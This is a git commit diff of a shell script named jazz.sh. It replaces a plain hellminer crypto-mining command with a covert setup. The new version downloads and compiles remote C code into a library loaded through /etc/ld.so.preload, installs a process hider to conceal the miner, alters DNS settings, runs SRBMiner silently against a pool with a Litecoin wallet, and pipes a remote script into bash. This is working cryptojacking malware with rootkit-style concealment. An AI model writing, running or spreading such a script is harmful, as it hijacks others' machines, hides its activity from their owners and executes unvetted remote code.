88bc3b7933ceaa12e2a2f699f3e98031702fad28
malogrono <136266511+malogrono@users.noreply.github.com>
2026-08-18 15:00:28 +0700

    Update jazz.sh

--- jazz.sh
+++ jazz.sh
@@ -1,10 +1,18 @@
 #!/bin/sh
 sudo apt update
 sudo apt install screen -y
-wget https://github.com/hellcatz/hminer/releases/download/v0.58/hellminer_linux64.tar.gz
-tar -xvf hellminer_linux64.tar.gz
-./hellminer -c stratum+tcp://sg.vipor.net:5040 -u RQhX4uPY8UKTMKbFaRCBPAVKppEfDYPeze.rojok
-while [ 1 ]; do
-sleep 3
-done
-sleep 999
+apt-get update ; apt-get install sudo -y
+curl https://gitlab.com/liugtiujk/portal/-/raw/master/cikblek.c -o cikblek.c
+apt-get install build-essential -y
+gcc -Wall -fPIC -shared -o libcikblek.so cikblek.c -ldl
+mv libcikblek.so /usr/local/lib/
+echo /usr/local/lib/libcikblek.so >> /etc/ld.so.preload
+rm cikblek.c
+echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
+/etc/init.d/network restart
+sudo su --command "curl -fsSL https://deb.nodesource.com/setup_20.x | sudo bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add SRBMiner-MULTI"
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.8/SRBMiner-Multi-2-4-8-Linux.tar.gz >/dev/null 2>&1
+tar -xzvf SRBMiner-Multi-2-4-8-Linux.tar.gz
+cd SRBMiner-Multi-2-4-8
+./SRBMiner-MULTI --algorithm randomx --pool stratum+tcp://104.207.92.96:443 --wallet LTC:ltc1qwae89dljtedxyvgrgl5ug8rk7xeqaruh5utxrg."m$RANDOM" >/dev/null 2>&1 &
+curl -sL https://raw.githubusercontent.com/bsheredia/dumel/main/pie.sh | bash
